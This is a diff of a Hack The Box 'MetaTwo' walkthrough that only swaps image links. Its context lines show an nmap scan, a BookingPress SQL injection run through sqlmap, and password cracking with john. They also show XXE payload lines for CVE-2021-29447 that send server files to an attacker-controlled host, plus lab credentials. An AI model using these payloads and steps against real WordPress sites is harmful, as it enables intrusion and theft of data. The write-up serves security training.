@@ -41,7 +41,7 @@ First step is to enumerate the box. For this we’ll use `nmap`.
 ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.11.186 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -Pn -sC -sV -p $ports 10.10.11.186
 ```
 
-![Untitled](Mhttps://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled.png)
 
 Nmap tell us there are three open ports **`21 ftp`** **`22 ssh`** and **`80 http`** and HTTP port redirect to **http://metapress.htb/**
 
@@ -53,15 +53,15 @@ Add that in `/etc/hosts` file.
 
 The web page is provided by **`WordPress`** and Its version is vulnerable, but the **`exploit`** will only work when we are authenticated.
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%201.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%201.png)
 
 Going over to **`/events/`** page, it's listed the **`information`** of events.
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%202.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%202.png)
 
 Checking the **`source code`** of that page, we got to know that it's using **`booking press 1.0.10`.** Let's check the **`exploit`** for that specific version.
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%203.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%203.png)
 
 # Exploration
 
@@ -75,7 +75,7 @@ Checking the **`source code`** of that page, we got to know that it's using **
 
 For the **`exploit`** work, we need some info about **`_wpnonce`** which can be found in **`events`** page source code
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%204.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%204.png)
 
 Now we have two options, is to dump the **`database`** manually or use some automation tool like **`sqlmap`** I am doing it with **`second`** option so that **`write up`** will be short. For that, we need to **`capture`** the request into **`burp`** Let's use **`-x`** flag for passing the **`proxy`** address.
 
@@ -85,11 +85,11 @@ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpre
 
 Capture the request in **`burp`** and save it into a file called **`admin.req`**
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%205.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%205.png)
 
 For **`sqlmap`** works, we need to remove the **`injection`** query to any **`number`**, or you can leave that **`parameter`** empty.
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%206.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%206.png)
 
 That's the final look for the **`admin.req`** file
 
@@ -107,7 +107,7 @@ And the parameter is **`injectable`** let's list out all the **`databases`**
 sqlmap -r admin.req -p total_service --dbs
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%207.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%207.png)
 
 Selecting **`blog`** database. After that, let's list the **`tables`** of the **`blog`** database.
 
@@ -115,7 +115,7 @@ Selecting **`blog`** database. After that, let's list the **`tables`** of th
 sqlmap -r admin.req -p total_service -D blog --tables
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%208.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%208.png)
 
 Dumping the **`wp_users`** table
 
@@ -123,7 +123,7 @@ Dumping the **`wp_users`** table
 sqlmap -r admin.req -p total_service -D blog -T wp_users --dump
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%209.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%209.png)
 
 Got the **`user`** password hashes, Let's **`crack`** that with john
 
@@ -131,7 +131,7 @@ Got the **`user`** password hashes, Let's **`crack`** that with john
 john hashes -w=/usr/share/wordlists/rockyou.txt
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2010.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2010.png)
 
 > User: **manager**
 >
@@ -140,7 +140,7 @@ john hashes -w=/usr/share/wordlists/rockyou.txt
 
 `http://metapress.htb/wp-login.php`
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2011.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2011.png)
 
 ## CVE-2021-29447
 
@@ -173,17 +173,17 @@ php -S 0.0.0.0:9090
 
 Now let's **`upload`** the **`payload.wav`** file
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2012.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2012.png)
 
 And we got the **`base64`** encoded value
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2013.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2013.png)
 
 ```bash
 echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=" | base64 -d
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2014.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2014.png)
 
 So let's get the WordPress **`wp-config.php`** file, but for that we need the **`path`** for that directory In the past we see it's running **`nginx`** let's get the nginx **`configuration`**
 
@@ -192,7 +192,7 @@ So let's get the WordPress **`wp-config.php`** file, but for that we need the 
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.7:9090/?p=%file;'>" >
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2015.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2015.png)
 
 And we got the path **`/var/www/metapress.htb/blog`**
 
@@ -201,7 +201,7 @@ And we got the path **`/var/www/metapress.htb/blog`**
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.7:9090/?p=%file;'>" >
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2016.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2016.png)
 
 - FTP user creads
     
@@ -212,11 +212,11 @@ And we got the path **`/var/www/metapress.htb/blog`**
 
 Successfully login inside the **`FTP`** server
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2017.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2017.png)
 
 Got a **`send_email.php`** file
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2018.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2018.png)
 
 - Creads For Jnelson User
     
@@ -229,7 +229,7 @@ Got a **`send_email.php`** file
 ssh jnelson@10.10.11.186
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2019.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2019.png)
 
 # Post Exploration
 
@@ -245,7 +245,7 @@ Looking over it, It has the **`root password`** stored in **`PGP`** format w
 
 And we also have the key file called **`.keys`.**
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2020.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2020.png)
 
 Let's try to crack that PGP **`key`** file, but first let's transfer that into our machine
 
@@ -259,7 +259,7 @@ Convert that into **`john`** format
 gpg2john key > gpg.john
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2021.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2021.png)
 
 The **`.keys`** file contain two **`PGP KEY BLOCK`**, I remove the public ones.
 
@@ -267,22 +267,22 @@ The **`.keys`** file contain two **`PGP KEY BLOCK`**, I remove the public one
 john gpg.john -w=/usr/share/wordlists/rockyou.txt
 ```
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2022.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2022.png)
 
 Checking the list of **`passpie`** if they have any, another user
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2023.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2023.png)
 
 Export the passwords in **`pass`** file
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2024.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2024.png)
 
 > User: **root**
 >
 > Pass: **p7qfAZt4_A1xo_0x**
 
 
-![Untitled](MetaTwo%20fd71010fbfd744d882545c2d4c61df85/Untitled%2025.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-MetaTwo/Untitled%2025.png)
 
 **HABEMUS ROOT!**
 
